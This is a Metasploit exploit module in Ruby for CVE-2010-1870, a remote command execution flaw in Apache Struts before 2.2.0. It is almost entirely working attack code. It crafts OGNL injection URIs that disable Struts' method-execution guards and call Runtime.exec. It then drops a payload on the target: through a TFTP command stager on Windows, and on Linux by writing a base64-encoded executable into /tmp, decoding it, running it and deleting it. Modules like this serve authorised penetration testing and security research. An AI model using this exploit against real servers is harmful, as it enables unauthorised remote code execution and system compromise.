# $Id: struts_code_exec.rb 13586 2011-08-19 05:59:32Z bannedit $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::CmdStagerTFTP
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Apache Struts < 2.2.0 Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a remote command execution vulnerability in
                Apache Struts versions < 2.2.0. This issue is caused by a failure to properly
                 
                    By sending a specially crafted request to the Struts application it is possible to
                bypass the "#" restriction on ParameterInterceptors by using OGNL context variables.
                Bypassing this restriction allows for the execution of arbitrary Java code.
            },
            &#039;Author&#039;         =>
                [
                    &#039;bannedit&#039;, # metasploit module
                    &#039;Meder Kydyraliev&#039;, # original public exploit
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13586 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-1870&#039;],
                    [ &#039;OSVDB&#039;, &#039;66280&#039;],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/14360/&#039; ],
                ],
            &#039;Platform&#039;      => [ &#039;win&#039;, &#039;linux&#039;],
            &#039;Privileged&#039;     => true,
            &#039;Targets&#039;        =>
                [
                    [&#039;Windows Universal&#039;,
                        {
                                &#039;Arch&#039; => ARCH_X86,
                                &#039;Platform&#039; => &#039;win&#039;
                        }
                    ],
                    [&#039;Linux Universal&#039;,
                        {
                                &#039;Arch&#039; => ARCH_X86,
                                &#039;Platform&#039; => &#039;linux&#039;
                        }
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;Jul 13 2010&#039;,
            &#039;DefaultTarget&#039; => 0))
 
            register_options(
                [
                    Opt::RPORT(8080),
                    OptString.new(&#039;URI&#039;, [ true, &#039;The path to a struts application action ie. /struts2-blank-2.0.9/example/HelloWorld.action&#039;, ""]),
                    OptString.new(&#039;CMD&#039;, [ false, &#039;Execute this command instead of using command stager&#039;, "" ])
                ], self.class)
    end
 
    def execute_command(cmd, opts = {})
        uri =  Rex::Text::uri_encode(datastore[&#039;URI&#039;])
        var_a = rand_text_alpha_lower(4)
        var_b = rand_text_alpha_lower(2)
        var_c = rand_text_alpha_lower(4)
        var_d = rand_text_alpha_lower(4)
        var_e = rand_text_alpha_lower(4)
         
        uri << "?(%27\\u0023_memberAccess[\\%27allowStaticMethodAccess\\%27]%27)(#{var_a})=true&"
        uri << "(aaaa)((%27\\u0023context[\\%27xwork.MethodAccessor.denyMethodExecution\\%27]\\u003d\\u0023#{var_c}%27)(\\u0023#{var_c}\\u003dnew%20java.lang.Boolean(\"false\")))&"
        uri << "(#{var_b})((%27\\u0023#{var_d}.exec(\"CMD\")%27)(\\u0023#{var_d}\\u003d@java.lang.Runtime@getRuntime()))=1" if target[&#039;Platform&#039;] == &#039;win&#039;
        uri << "(asdf)((&#039;\\u0023rt.exec(\"CMD\".split(\"@\"))&#039;)(\\u0023rt\\u003d@java.lang.Runtime@getRuntime()))=1" if target[&#039;Platform&#039;] == &#039;linux&#039;
        uri.gsub!(/CMD/, Rex::Text::uri_encode(cmd))
 
        vprint_status("Attemping to execute: #{cmd}")
 
        resp = send_request_raw({
            &#039;uri&#039;     => uri,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;method&#039;  => &#039;GET&#039;,
        }, 5)
    end
 
    def windows_stager
        exe_fname = rand_text_alphanumeric(4+rand(4)) + ".exe"
 
        print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
        execute_cmdstager({ :temp => &#039;.&#039;})
        @payload_exe = payload_exe
 
        print_status("Attempting to execute the payload...")
        execute_command(@payload_exe)
    end
 
    def linux_stager
        cmds = "/bin/sh@-c@echo LINE | tee FILE"
        exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
        base64 = Rex::Text.encode_base64(exe)
        base64.gsub!(/\=/, "\\u003d")
        file = rand_text_alphanumeric(4+rand(4))
 
        execute_command("/bin/sh@-c@touch /tmp/#{file}.b64")
        cmds.gsub!(/FILE/, "/tmp/" + file + ".b64")
        base64.each_line do |line|
            line.chomp!
            cmd = cmds
            cmd.gsub!(/LINE/, line)
            execute_command(cmds)
        end
 
        execute_command("/bin/sh@-c@base64 -d /tmp/#{file}.b64|tee /tmp/#{file}")
        execute_command("/bin/sh@-c@chmod +x /tmp/#{file}")
        execute_command("/bin/sh@-c@rm /tmp/#{file}.b64")
 
        execute_command("/bin/sh@-c@/tmp/#{file}")
        @payload_exe = "/tmp/" + file
    end
 
    def on_new_session(client)
        if target[&#039;Platform&#039;] == &#039;linux&#039;
            print_status("deleting #{@payload_exe} payload file")
            execute_command("/bin/sh@-c@rm #{@payload_exe}")
        else
            print_status("Windows does not allow running executables to be deleted")
            print_status("delete the #{@payload_exe} file manually after migrating")
        end
    end
 
    def exploit
        if not datastore[&#039;CMD&#039;].empty?
            print_status("Executing user supplied command")
            execute_command(datastore[&#039;CMD&#039;])
            return
        end
 
        case target[&#039;Platform&#039;]
            when &#039;linux&#039;
                linux_stager
            when &#039;win&#039;
                windows_stager
            else
                raise RuntimeError, &#039;Unsupported target platform!&#039;
        end
 
        handler
    end
end



